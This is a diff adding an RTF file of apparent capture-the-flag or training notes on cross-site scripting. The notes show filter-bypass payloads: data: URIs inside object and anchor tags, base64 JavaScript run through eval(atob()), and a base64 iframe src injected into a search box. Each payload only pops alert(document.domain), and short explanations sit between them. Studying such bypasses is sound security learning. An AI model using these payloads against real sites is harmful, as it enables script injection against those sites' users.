@@ -1,0 +1,95 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 Times-Roman;\f2\fmodern\fcharset0 Courier;
+\f3\fmodern\fcharset0 Courier-Bold;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue233;}
+{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc0\levelnfcn0\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{decimal\}.}{\leveltext\leveltemplateid1\'02\'00.;}{\levelnumbers\'01;}\fi-360\li720\lin720 }{\listname ;}\listid1}}
+{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}}
+\paperw11900\paperh16840\margl1440\margr1440\vieww23520\viewh12500\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs32 \cf0 \
+\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls1\ilvl0\cf0 {\listtext	1.	}<object data=\'93data:text/html,<script>alert(1)</script>\'94>\
+{\listtext	2.	}<object data=\'93data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\'94>\
+{\listtext	3.	}<a href=\'94data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\'94>Click here</a>\
+\pard\pardeftab720\partightenfactor0
+\cf0 \
+\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f1 \cf0 \expnd0\expndtw0\kerning0
+All modern browsers have a global function galled 
+\f2 atob()
+\f1  to decode Base64 strings,\
+\
+ To execute a string as JavaScript, use {\field{\*\fldinst{HYPERLINK "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"}}{\fldrslt \cf2 \ul \ulc2 eval()}}
+\fs28 .\
+\
+
+\f3\b 	"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>\
+
+\f0\b0\fs32 \kerning1\expnd0\expndtw0 						alert(document.domain)\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf0 \expnd0\expndtw0\kerning0
+If the words 
+\f2 script
+\f1 , 
+\f2 style
+\f1  and 
+\f2 on
+\f1  aren't allowed, we have to think about something else this time. Apparently it's possible to encode JavaScript as Base64 and make it execute as an iframe src. \
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf0 :::html\
+<iframe src="data:text/html;base64, .... base64 encoded HTML data ....">\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf0 \
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf0 :::html\
+<script>parent.alert(document.domain);</script>\
+\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+\cf0 parent.
+\f1  is needed because we want the alert to execute in the context of the parent's window. Encoding it as Base64 with the {\field{\*\fldinst{HYPERLINK "http://ha.ckers.org/xsscalc.html"}}{\fldrslt \cf2 \ul \ulc2 Character Encoding Calculator}} results in:\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf0 PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4\
+\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1 \cf0 The code that we will then put into the search box to finish the level is:\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2 \cf0 :::html\
+"><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+
+\f0 \cf0 \kerning1\expnd0\expndtw0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\pard\pardeftab720\partightenfactor0
+
+\b \cf0 \ul References
+\b0 \ulnone \
+\
+https://stackoverflow.com/questions/2820249/base64-encoding-and-decoding-in-client-side-javascript\
+\
+https://stackoverflow.com/questions/3462758/is-it-possible-to-fake-the-src-attribute-of-an-iframe/3462800#3462800\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardeftab720\pardirnatural\partightenfactor0
+\cf0 \
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+}
